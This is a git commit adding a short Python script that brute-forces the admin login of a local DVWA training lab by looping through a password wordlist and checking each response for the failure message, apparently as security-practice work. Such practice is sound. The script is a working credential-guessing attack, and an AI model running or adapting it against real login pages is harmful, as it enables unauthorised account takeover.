997aba52ea013438632c9799fd63bfb79a5392bd
Blue-B <55532956+Blue-B@users.noreply.github.com>
2022-07-17 16:44:30 +0900

    Add files via upload

---
+++ dvwa-low-bruteforce.py
@@ -0,0 +1,30 @@
+import requests
+
+URL="http://127.0.0.1/dvwa/vulnerabilities/brute/"
+cookies = {'PHPSESSID': 'd0p9dcb46gevv04npif5k0i858',
+           'security': 'low'}
+
+params = {'username':'',
+          'password':'',
+          'Login':'Login'}
+
+
+with open('C:\\Users\\root\\Downloads\\pw.txt', 'r') as f:
+    pwline = f.readlines()
+
+passwords =[]
+for word in pwline:
+    passwords.append(word.strip().replace('\n','')) 
+
+
+for password in passwords:    
+    params['username'] = 'admin'
+    params['password'] = password
+
+    req = requests.get(URL , params=params, cookies=cookies)
+    
+    if "Username and/or password incorrect." not in req.text:
+        print(f'로그인 성공 : {password}')
+        break
+    else:
+        print(f'로그인 실패 : {password}')
